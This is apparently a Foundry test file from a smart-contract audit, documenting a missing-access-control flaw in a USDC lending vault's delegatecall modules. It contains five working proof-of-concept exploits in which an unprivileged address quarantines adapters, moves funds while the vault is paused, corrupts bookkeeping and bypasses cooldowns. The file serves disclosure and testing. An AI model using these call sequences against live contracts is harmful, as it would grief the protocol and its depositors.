// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * FINDING: Missing access control on delegatecall-module externals reachable
 *          via UsdcMultiLendingVault.fallback() -- STILL PRESENT on
 *          feature/v10.0-storage-initialize, unchanged from `main`, and with
 *          a LARGER blast radius: this branch moved `realizeLiquidity()`'s
 *          implementation into `StrategyAdapterOpsModule.executeRealizeLiquidity()`
 *          and added `StrategyAdapterOpsModule.syncPositionAssets(bool)` --
 *          both new unprotected entry points, in addition to the original
 *          set (`safeAdapterDeposit`, `adapterDeposit`, `recordAdapterFailure`,
 *          `recordAdapterSuccess`, `recordWithdrawGas`, and
 *          `StrategyScoringModule.deployIdleToAdapters`/`computeInputsForPlan`).
 * SEVERITY: HIGH, unchanged.
 *
 * `onlyDelegateCall` (`require(address(this) != _self, ...)`) only rejects a
 * direct call to the standalone module contract -- it does not check
 * msg.sender or any role. `UsdcLendingStrategy.fallback()` still delegatecalls
 * any unrecognized selector to a fixed 6-module chain for ANY caller, with no
 * access check before dispatch (verified unchanged at
 * UsdcLendingStrategy.sol:936-955 on this branch).
 *
 * `StrategyRebalancePlanModule`'s entry points DO have the correct fix
 * (`onlyRoleOrRevert(KEEPER_ROLE)` alongside `onlyDelegateCall`) -- proving
 * the team knows the right pattern. It was simply never applied to
 * `StrategyAdapterOpsModule` or `StrategyScoringModule`, the two modules the
 * original finding named.
 */

import { Test, console2 } from "forge-std/Test.sol";
import { Unauthorized } from "../../../../src/strategies/usdc-lending/controller/StrategyStorageLayout.sol";
import {
    UsdcMultiLendingVaultTestBase,
    MockUSDC,
    MockLendingAdapter
} from "../UsdcMultiLendingVault.t.sol";

contract AccessControlBypass_PoC is UsdcMultiLendingVaultTestBase {
    address attacker = address(0xA11CE);

    function setUp() public override {
        super.setUp();
        _addAndEnableAdapter(adapter1);
    }

    /// @notice PoC A — permissionless, zero-cost forced quarantine of a
    ///         perfectly healthy adapter (unchanged from main).
    function test_POC_A_permissionless_forced_quarantine() public {
        assertFalse(vault.quarantined(address(adapter1)));
        assertFalse(vault.hasRole(KEEPER_ROLE, attacker));
        assertFalse(vault.hasRole(PARAM_ROLE, attacker));
        assertFalse(vault.hasRole(DEFAULT_ADMIN_ROLE, attacker));

        uint8 threshold = vault.adapterQuarantineThreshold();
        vm.startPrank(attacker);
        for (uint8 i = 0; i < threshold; i++) {
            (bool ok, ) = address(vault).call(
                abi.encodeWithSignature("recordAdapterFailure(address)", address(adapter1))
            );
            require(ok, "recordAdapterFailure call unexpectedly failed");
        }
        vm.stopPrank();

        assertTrue(
            vault.quarantined(address(adapter1)),
            "VULNERABLE: unprivileged attacker quarantined a healthy adapter via StrategyAdapterOpsModule.recordAdapterFailure"
        );
    }

    /// @notice PoC B — permissionless deployment of idle capital that
    ///         bypasses `pause()` (unchanged from main).
    function test_POC_B_permissionless_deployIdle_bypasses_pause() public {
        uint256 idleAmt = 100e6;
        usdc.mint(address(vault), idleAmt);

        vm.prank(admin);
        vault.pause();
        assertTrue(vault.paused());

        vm.prank(keeper);
        (bool viaIntended, ) = address(vault).call(abi.encodeWithSignature("deployIdle()"));
        assertFalse(viaIntended, "sanity: legitimate deployIdle() is blocked while paused, as designed");

        uint256 posBefore = vault.positionAssets(address(adapter1));

        vm.prank(attacker);
        (bool ok, ) = address(vault).call(
            abi.encodeWithSignature("deployIdleToAdapters(uint256,bool)", idleAmt, true)
        );
        require(ok, "deployIdleToAdapters call unexpectedly failed");

        assertGt(
            vault.positionAssets(address(adapter1)), posBefore,
            "VULNERABLE: unprivileged attacker deployed vault capital into an adapter while the vault was paused"
        );
    }

    /// @notice PoC C — permissionless direct fund movement that corrupts
    ///         `positionAssets` bookkeeping (unchanged from main).
    function test_POC_C_permissionless_safeAdapterDeposit_desyncs_accounting() public {
        uint256 amt = 50e6;
        usdc.mint(address(vault), amt);

        uint256 posBefore = vault.positionAssets(address(adapter1));
        uint256 adapterBalBefore = adapter1.deposited();

        vm.prank(attacker);
        (bool ok, bytes memory ret) = address(vault).call(
            abi.encodeWithSignature("safeAdapterDeposit(address,uint256)", address(adapter1), amt)
        );
        require(ok, "safeAdapterDeposit call unexpectedly failed");
        assertTrue(abi.decode(ret, (bool)));

        assertEq(adapter1.deposited(), adapterBalBefore + amt, "sanity: the adapter really received the funds");
        assertEq(
            vault.positionAssets(address(adapter1)), posBefore,
            "VULNERABLE: real funds moved into the adapter but vault bookkeeping was never updated"
        );
    }

    /// @notice PoC D — NEW on this branch: `realizeLiquidity()`'s
    ///         implementation moved to
    ///         `StrategyAdapterOpsModule.executeRealizeLiquidity(uint256)`,
    ///         which is directly reachable, bypassing the intended
    ///         `onlyKeeperOrCore` gate on the vault's `realizeLiquidity()`
    ///         wrapper. An unprivileged caller can force the vault to yank
    ///         capital out of a yield-bearing adapter position into idle
    ///         cash at will -- pure griefing (lost yield, forced withdrawal
    ///         friction/slippage on the adapter side) with zero privilege.
    function test_POC_D_permissionless_executeRealizeLiquidity() public {
        uint256 depositAmt = 100_000e6;
        _mintAndTransferToVault(core, depositAmt);
        vm.prank(core);
        vault.deposit(depositAmt);

        uint256 posBefore = vault.positionAssets(address(adapter1));
        assertGt(posBefore, 0, "sanity: adapter1 holds a real yield-bearing position");

        // The legitimate wrapper is properly gated.
        vm.prank(attacker);
        vm.expectRevert(Unauthorized.selector);
        vault.realizeLiquidity(posBefore);

        // The raw module entry point it delegates to is not.
        vm.prank(attacker);
        (bool ok, ) = address(vault).call(
            abi.encodeWithSignature("executeRealizeLiquidity(uint256)", posBefore)
        );
        require(ok, "executeRealizeLiquidity call unexpectedly failed");

        assertLt(
            vault.positionAssets(address(adapter1)), posBefore,
            "VULNERABLE: unprivileged attacker forced capital out of a yield-bearing position via the unguarded raw module entry point"
        );
    }

    /// @notice PoC E — NEW on this branch:
    ///         `StrategyAdapterOpsModule.syncPositionAssets(bool force)` is
    ///         directly reachable and, with `force=true`, bypasses the
    ///         `minSecondsBetweenSync` cooldown that gates every other sync
    ///         path -- an unprivileged caller can force repeated position
    ///         syncs at will, for free.
    function test_POC_E_permissionless_forced_sync_bypasses_cooldown() public {
        vm.prank(attacker);
        (bool ok, ) = address(vault).call(abi.encodeWithSignature("syncPositionAssets(bool)", true));
        require(ok, "VULNERABLE-CHECK: unprivileged syncPositionAssets(true) call unexpectedly failed -- entry point should be unauthenticated but reachable");
    }
}
